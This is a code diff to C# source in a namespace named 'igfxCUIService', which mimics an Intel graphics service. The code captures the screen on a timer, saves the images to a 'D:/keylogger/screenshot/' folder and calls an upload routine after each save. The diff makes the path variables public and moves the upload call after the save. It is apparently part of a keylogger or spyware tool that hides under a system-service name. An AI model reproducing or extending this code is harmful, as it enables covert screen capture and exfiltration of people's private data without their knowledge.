@@ -18,10 +18,11 @@ namespace igfxCUIService
 
         #region[variable]
         private static DateTime datum = DateTime.Now;
-        private static decimal hour;
-        private static decimal minuten;
-        private static decimal seconde;
-        public static System.Drawing.Bitmap image;
+        public static decimal hour;
+        public static decimal minuten;
+        public static decimal seconde;
+        public static string folderName = @"D:/keylogger/screenshot/";
+        public static string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
         #endregion
 
         #region [ aantal screenshots]
@@ -52,16 +53,11 @@ namespace igfxCUIService
                 {
                     g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                 }
-
-                image = bitmap;
-                Upload.Uploadfile();
-
                 
-                string folderName = @"D:/keylogger/screenshot/";
-                string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
                 System.IO.Directory.CreateDirectory(pathString);
                 bitmap.Save(pathString + hour + "." + minuten + "." + seconde + ".jpeg", ImageFormat.Jpeg);
-                
+                 
+                Upload.Uploadfile();
             }
         }
 
